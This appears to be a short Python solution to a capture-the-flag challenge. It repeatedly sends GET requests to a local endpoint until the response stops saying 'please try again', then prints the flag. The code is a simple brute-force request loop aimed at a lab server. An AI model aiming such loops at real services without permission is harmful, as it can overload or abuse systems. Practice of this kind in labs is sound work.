# Write a script that makes HTTP requests to the server
# http://127.0.0.1:8082/selfdestruct until the numbers match
# and read the response to get the flag.
# You can easily run out of execution time in this challenge.
# You will need to check the response and stop your attack
# once you see the flag.
import requests

url = "http://127.0.0.1:8082/selfdestruct"

while True:
    # if response contains "please try again" then continue
    response = requests.get(url, timeout=5)
    if "please try again" in response.text:
        continue
    else:
        print(response.text)
        break
    